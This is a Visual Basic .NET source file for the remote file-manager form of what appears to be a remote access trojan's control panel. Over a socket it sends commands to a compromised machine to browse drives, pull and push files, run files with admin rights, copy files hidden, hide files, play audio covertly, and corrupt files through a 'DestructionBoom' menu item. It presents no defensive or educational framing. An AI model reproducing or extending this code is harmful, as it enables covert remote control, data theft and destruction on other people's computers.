Imports System.Runtime.InteropServices
Imports System.IO
Public Class Form5
    Public xxx As Integer
    Public yy As String = "|U|"
    Dim pk As New TextBox
    Dim RichTextBox2 As New RichTextBox
    Dim fff As New TextBox
    <DllImport("uxtheme", CharSet:=CharSet.Unicode)>
    Public Shared Function SetWindowTheme(ByVal hWnd As IntPtr, ByVal textSubAppName As String, ByVal textSubIdList As String) As Integer
    End Function
    Private Sub Form5_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next

        If My.Settings.lolo = 1 Then
            Me.ListView1.View = System.Windows.Forms.View.Tile
        End If
        If My.Settings.lolo = 2 Then
            Me.ListView1.View = System.Windows.Forms.View.Details
        End If

        'Panel2.Hide()
        ContextMenuStrip1.Renderer = New clsVistaToolStripRenderer
     
        TextBox5.Text = Form1.L1.Items.Item(Form1.L1.FocusedItem.Index).SubItems.Item(0).Text
        'PictureBox1.Hide()
        Label1.Hide()
        pic1.Controls.Add(Label1)

        Form1.S.Send(xxx, "GetDrives" & yy) ' Ask Server to Get Drives
        SetWindowTheme(ListView2.Handle, "explorer", Nothing)
        SetWindowTheme(ListView1.Handle, "explorer", Nothing)
        On Error Resume Next
        'ToolTip1.Active = True

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
  On Error Resume Next
        ListView3.Items.Clear()







        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "getdesktoppath")
        Next
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
  On Error Resume Next
        ListView3.Items.Clear()


        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "getstartuppath")
        Next
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
  On Error Resume Next
        ListView3.Items.Clear()


        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "gettemppath")
        Next
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click


   On Error Resume Next
        ListView3.Items.Clear()

        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "getmydocumentspath")
        Next
    End Sub

    Private Sub BackToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles BackToolStripMenuItem1.Click
        If TextBox1.Text = "" Then
        Else
            ListView3.Items.Add(TextBox1.Text)
            ListView3.MultiSelect = False
            ListView3.Focus()
            If ListView3.FocusedItem.Index < ListView3.Items.Count + 1 Then
                On Error Resume Next


                ListView3.Items(ListView3.FocusedItem.Index + 1).Selected = True
                ListView3.Items(ListView3.FocusedItem.Index + 1).Focused = True

            End If
        End If

        If TextBox1.Text.Length < 4 Then
            TextBox1.Text = ""
            Form1.S.Send(xxx, "GetDrives" & yy)
        Else
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
            RefreshList()
        End If


    End Sub

    Public Sub RefreshList()


        Form1.S.Send(xxx, "FileManager" & yy & TextBox1.Text)



    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        RefreshList()
    End Sub

    Private Sub CorruptFileToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub

 

    Private Sub ExecuteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExecuteToolStripMenuItem.Click










    End Sub



    Private Sub DownloadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadToolStripMenuItem.Click
        'PictureBox1.Show()
        'Label2.Show()



        Dim fs As New Form14


        TextBox3.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text

        fs.Show()
        fs.Label2.Text = TextBox3.Text
        fs.TopMost = True
        fs.TopMost = False
        fs.TextBox2.Text = TextBox5.Text







        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "downloadfile" & "|U|" & TextBox1.Text & ListView1.FocusedItem.Text & "|U|" & ListView1.FocusedItem.Text)
        Next



        ListView2.Items.Add("_+ (" + ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text & ") (Size " + ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(1).Text + ")")
        For Each Process As ListViewItem In ListView2.Items
            If Process.Text.Contains("_+ (") Then

                Process.ForeColor = Color.DodgerBlue

                Process.ImageIndex = 0

            End If
        Next






















        'Label2.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text
    End Sub

    Private Sub UploadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadToolStripMenuItem.Click
        Dim o As New OpenFileDialog
        o.ShowDialog()
        If o.FileName.Length > 0 Then
            Dim n As New IO.FileInfo(o.FileName)
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "sendfileto" & yy & TextBox1.Text & n.Name & yy & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
        End If








        ListView2.Items.Add("--->To a Path-->" + TextBox1.Text & ") (Name " + o.FileName + ")")
        For Each Process As ListViewItem In ListView2.Items
            If Process.Text.Contains("--->To a Path-->") Then

                Process.ForeColor = Color.CadetBlue

                Process.ImageIndex = 1

            End If
        Next









        'ListView2.Items.Add("(" + ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text & ") (Size " + ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(1).Text + ")")

    End Sub

    Private Sub NewFolderToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub HideFolderFileToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub ShowFolderFileToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub NewTextFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NewTextFileToolStripMenuItem.Click
 
    End Sub

    Private Sub ViewEditTextToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ViewEditTextToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "edittextfile" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub OpenFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenFolderToolStripMenuItem.Click
        'System.Diagnostics.Process.Start(Form1.folder)


        Dim folders = (Application.StartupPath & "/bookbinder/" & (TextBox5.Text) & "/Download\")

        System.Diagnostics.Process.Start(folders)



    End Sub





 











    Private Sub pic1_Click(sender As Object, e As EventArgs) Handles pic1.Click


        If pic1.Image Is Nothing Then

        Else







            Dim f As New Form6


            f.Show()
            f.PictureBox1.Image = pic1.Image

            f.Label1.Text = Label1.Text
            f.TopMost = True
            f.TopMost = False
      



        End If





    End Sub

    Private Sub ToolStripStatusLabel1_Click(sender As Object, e As EventArgs)
        If TextBox1.Text.Length < 4 Then
            TextBox1.Text = ""
            Form1.S.Send(xxx, "GetDrives" & yy)
        Else
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
            RefreshList()

        End If
    End Sub

    Private Sub ToolStripStatusLabel2_Click(sender As Object, e As EventArgs)
        RefreshList()
    End Sub

    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        On Error Resume Next
        ListView3.Items.Clear()







        TextBox1.Text += "\" + ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text + "\"
        RefreshList()
    End Sub
 

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

  On Error Resume Next
        ListView3.Items.Clear()

        TextBox1.Text = ""
        Form1.S.Send(xxx, "GetDrives" & yy) ' Ask Server to Get Drives
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        On Error Resume Next
        If pic1.Image Is Nothing Then
            Label1.Hide()
        Else
            Label1.Show()

        End If

        If ListView3.Items.Count = 0 Then
            Button7.Enabled = False
        Else
            Button7.Enabled = True
        End If
  


    End Sub




    Private Sub TextBox1_KeyPress(sender As Object, e As KeyPressEventArgs) Handles TextBox1.KeyPress
        If e.KeyChar = Chr(Keys.Enter) Then
            If TextBox1.Text = "" Then


            Else
                On Error Resume Next
                TextBox1.Text += "\" + ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text + "\"
                RefreshList()

            End If
        End If
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
 

    End Sub



  
    Private Sub TextBox2_KeyPress(sender As Object, e As KeyPressEventArgs) Handles TextBox2.KeyPress
        On Error Resume Next
        If e.KeyChar = Chr(Keys.Back) Then

            RefreshList()
        Else


            For Each item As ListViewItem In ListView1.Items
                If Not item.SubItems(0).Text.ToLower.Contains(TextBox2.Text.ToLower) Then
                    item.Remove()
                End If
            Next
        End If













    End Sub

    Private Sub TextBox2_MouseClick(sender As Object, e As MouseEventArgs) Handles TextBox2.MouseClick
        If TextBox2.Text = "Find" Then
            If TextBox2.ForeColor = Color.Silver Then
                TextBox2.Text = ""
                TextBox2.ForeColor = Color.Black
            End If
        End If
    End Sub

    Private Sub TextBox2_MouseMove(sender As Object, e As MouseEventArgs) Handles TextBox2.MouseMove

    End Sub

    Private Sub TextBox2_TextChanged(sender As Object, e As EventArgs) Handles TextBox2.TextChanged
        If TextBox2.Text = "" Then
            TextBox2.ForeColor = Color.Black
        End If
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        If TextBox1.Text = "" Then
        Else
            ListView3.Items.Add(TextBox1.Text)
            ListView3.MultiSelect = False
            ListView3.Focus()
            If ListView3.FocusedItem.Index < ListView3.Items.Count + 1 Then
                On Error Resume Next


                ListView3.Items(ListView3.FocusedItem.Index + 1).Selected = True
                ListView3.Items(ListView3.FocusedItem.Index + 1).Focused = True

            End If
        End If







        If TextBox1.Text.Length < 4 Then
            TextBox1.Text = ""
            Form1.S.Send(xxx, "GetDrives" & yy)
        Else
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
            RefreshList()

        End If




    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        On Error Resume Next

        ListView3.MultiSelect = False
        ListView3.Focus()
        If ListView3.FocusedItem.Index < ListView3.Items.Count + 1 Then



            ListView3.Items(ListView3.FocusedItem.Index - 1).Selected = True
            ListView3.Items(ListView3.FocusedItem.Index - 1).Focused = True

        End If
        TextBox1.Text = ListView3.Items.Item(ListView3.FocusedItem.Index).SubItems.Item(0).Text
        RefreshList()
    End Sub

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        RefreshList()
    End Sub

    Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem3.Click
        Dim n As String

        n = InputBox("Enter The folder's Name", "Creat New Folder")
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "creatnewfolder" & yy & TextBox1.Text & n)
        Next
        RefreshList()
    End Sub

    Private Sub ToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem4.Click
        Dim n As String

        n = InputBox("Enter The rtf File's Name", "Creat New rtf File")
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "creatnewtextfile" & yy & TextBox1.Text & n & ".rtf")
        Next
        RefreshList()
    End Sub

    Private Sub ToolStripMenuItem5_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem5.Click
        Dim n As String

        n = InputBox("Enter The log File's Name", "Creat New log File")
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "creatnewtextfile" & yy & TextBox1.Text & n & ".log")
        Next
        RefreshList()
    End Sub

    Private Sub ToolStripMenuItem6_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub AdminRunToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AdminRunToolStripMenuItem.Click
        Form1.S.Send(xxx, "Exletn" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
    End Sub

 
    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        'If Not pic1.Image Is Nothing Then
        'Else

        'End If

    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub CopyNormilToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyNormilToolStripMenuItem.Click
        Form1.S.Send(xxx, "CpoSx" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
    End Sub

    Private Sub CopyHideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyHideToolStripMenuItem.Click
        Form1.S.Send(xxx, "IOPPYR" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Form1.S.Send(xxx, "Cuut" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        TextBox4.Text = ListView1.FocusedItem.Text
        pk.Text = "Copy"
    End Sub

    Private Sub PaSteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PaSteToolStripMenuItem.Click
        If pk.Text = "Cut" Then
            Form1.S.Send(xxx, "Cuutodsd" & yy & TextBox1.Text + TextBox4.Text)
            RefreshList()
        End If

        If pk.Text = "Copy" Then
            Form1.S.Send(xxx, "dCopsx" & yy & TextBox1.Text + TextBox4.Text)
            RefreshList()
        End If

    End Sub

    Private Sub DeleteToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem1.Click
        Select Case ListView1.FocusedItem.ImageIndex
            Case 0 To 1
            Case 2
                Form1.S.Send(xxx, "Delete" & yy & "Folder" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
            Case Else
                Form1.S.Send(xxx, "Delete" & yy & "File" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        End Select
        RefreshList()
    End Sub

    Private Sub TxtToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TxtToolStripMenuItem.Click
        Dim n As String

        n = InputBox("Enter The vbs File's Name", "Creat New vbs File")
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "creatnewtextfile" & yy & TextBox1.Text & n & ".vbs")
        Next
        RefreshList()
    End Sub

    Private Sub DestructionBoomToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DestructionBoomToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "corrupt" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
        RefreshList()
    End Sub

    Private Sub RunTheFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunTheFileToolStripMenuItem.Click
        Form1.S.Send(xxx, "Execute" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
    End Sub

    Private Sub ToolStripMenuItem6_Click_1(sender As Object, e As EventArgs) Handles ToolStripMenuItem6.Click
        Dim a As String
        a = InputBox("Enter New Name", "Rename", ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text)

        If a <> "" Then
            Select Case ListView1.FocusedItem.ImageIndex
                Case 0 To 1
                Case 2
                    Form1.S.Send(xxx, "Rename|U|Folder|U|" & TextBox1.Text & ListView1.FocusedItem.Text & "|U|" & a)
                Case Else
                    Form1.S.Send(xxx, "Rename|U|File|U|" & TextBox1.Text & ListView1.FocusedItem.Text & "|U|" & a)
            End Select
        End If
        RefreshList()
    End Sub

  
    Private Sub ToolStripMenuItem7_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem7.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "hidefolderfile" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub ToolStripMenuItem8_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem8.Click
        On Error Resume Next
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "showfolderfile" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub PlayMusicHidenToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles PlayMusicHidenToolStripMenuItem1.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "playmusic" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub SetAsWallpaperToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles SetAsWallpaperToolStripMenuItem1.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "setaswallpaper" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub ElseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ElseToolStripMenuItem.Click
        Dim n As String

        n = InputBox("Enter The Text File's Name", "Creat New Text File")
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "creatnewtextfile" & yy & TextBox1.Text & n & ".txt")
        Next
        RefreshList()











    End Sub

    Private Sub ElseTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ElseTToolStripMenuItem.Click
        Dim n As String
        n = InputBox("Name.??", "Creat New Else File")
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "creatnewtextfile" & yy & TextBox1.Text & n)
        Next
        RefreshList()
    End Sub
    Private Sub PressureToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PressureToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "EIIT" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
        RefreshList()
    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick

        Dim C As String
        C = ListView1.Items.Count.ToString
        ToolStripStatusLabel1.Text = "Files(" & C & ")"
    End Sub

    Private Sub Panel1_MouseMove(sender As Object, e As MouseEventArgs) Handles Panel1.MouseMove
        'If TextBox2.Text = "" Then
        '    If TextBox2.ForeColor = Color.Black Then
        '        TextBox2.Text = "Find"
        '        TextBox2.ForeColor = Color.Silver


        '    End If
        'End If
    End Sub

    Private Sub Panel1_Paint(sender As Object, e As PaintEventArgs) Handles Panel1.Paint

    End Sub

    Private Sub FLOCToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FLOCToolStripMenuItem.Click
        Form1.S.Send(xxx, "CLLSKXOa")
    End Sub

    Private Sub ListView1_DoubleClick(sender As Object, e As EventArgs) Handles ListView1.DoubleClick
        On Error Resume Next
        If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 2 Then
            If TextBox1.Text.Length = 0 Then
                TextBox1.Text += ListView1.FocusedItem.Text




            Else
                TextBox1.Text += ListView1.FocusedItem.Text & "\"
            End If

            RefreshList()
        End If

    End Sub

    Private Sub ListView1_KeyPress(sender As Object, e As KeyPressEventArgs) Handles ListView1.KeyPress
        Try
            If e.KeyChar = ControlChars.Back Then
                If TextBox1.Text.Length = 3 Then
                Else
                    TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
                    TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
                    RefreshList()

                End If
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub ListView1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles ListView1.MouseDoubleClick

        On Error Resume Next
        ListView3.Items.Clear()

    End Sub

  

    Private Sub ListView1_SelectedIndexChanged_1(sender As Object, e As EventArgs) Handles ListView1.SelectedIndexChanged
        On Error Resume Next
   


        fff.Text = ""
        RichTextBox2.Text = ""
        fff.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text
        Dim aa As String = fff.Text
        Dim aa1 As String = fff.Text
        RichTextBox2.Text = aa.LastIndexOf(".")
        Dim xx1 As String = fff.Text
        RichTextBox2.Text = xx1.Substring(RichTextBox2.Text)

        'MsgBox(RichTextBox2.Text)


        If RichTextBox2.Text = ".png" Then
            ue()
        ElseIf RichTextBox2.Text = ".ico" Then
            ue()
        ElseIf RichTextBox2.Text = ".bmp" Then
            ue()
        ElseIf RichTextBox2.Text = ".gif" Then
            ue()
        ElseIf RichTextBox2.Text = ".jpg" Then
            ue()
        ElseIf RichTextBox2.Text = ".jpeg" Then
            ue()




        Else
            pic1.Image = Nothing
            'pic1.ImageLocation = "IOS\Ls.png"


        End If


      



    End Sub
    Sub ue()
        pic1.Image = Nothing
        'pic1.ImageLocation = "IOS\Ls.png"
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(xxx, "viewimage" & "|U|" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
        pic1.Controls.Add(Label1)
        Label1.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(1).Text & vbNewLine + ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text

    End Sub
    Private Sub ListView2_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles ListView2.MouseDoubleClick
        System.Diagnostics.Process.Start(Application.StartupPath & "\bookbinder\" + TextBox5.Text + "\Download\")

    End Sub

   

    Private Sub ListView2_SelectedIndexChanged_1(sender As Object, e As EventArgs) Handles ListView2.SelectedIndexChanged

        On Error Resume Next


    End Sub

    Private Sub ListView1_TabStopChanged(sender As Object, e As EventArgs) Handles ListView1.TabStopChanged

    End Sub

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        Form1.S.Send(xxx, "Cuutod" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        TextBox4.Text = ListView1.FocusedItem.Text
        pk.Text = "Cut"
    End Sub

    Private Sub CharacteristicsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CharacteristicsToolStripMenuItem.Click

        Dim f As New Form33
        If pic1.Image Is Nothing Then

        Else
            f.PictureBox1.Image = pic1.Image

        End If

        f.Show()
        f.TextBox3.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(1).Text
        f.TextBox4.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text
        f.Text = ListView1.FocusedItem.Text
        f.TextBox2.Text = TextBox1.Text
        f.TextBox6.Text = TextBox1.Text + ListView1.FocusedItem.Text
        f.TopMost = True
        f.TopMost = False

    End Sub

    Private Sub Q1ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Q1ToolStripMenuItem.Click
        Form1.S.Send(xxx, "EMNS" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
    End Sub

    Private Sub Q2ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Q2ToolStripMenuItem.Click
        Form1.S.Send(xxx, "EMNqS" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
    End Sub

    Private Sub ToolStripMenuItem10_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem10.Click
        Me.ListView1.View = System.Windows.Forms.View.Tile
        My.Settings.lolo = 1
        My.Settings.Save()

    End Sub

    Private Sub ToolStripMenuItem11_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem11.Click
        Me.ListView1.View = System.Windows.Forms.View.Details
        My.Settings.lolo = 2
        My.Settings.Save()
    End Sub
End Class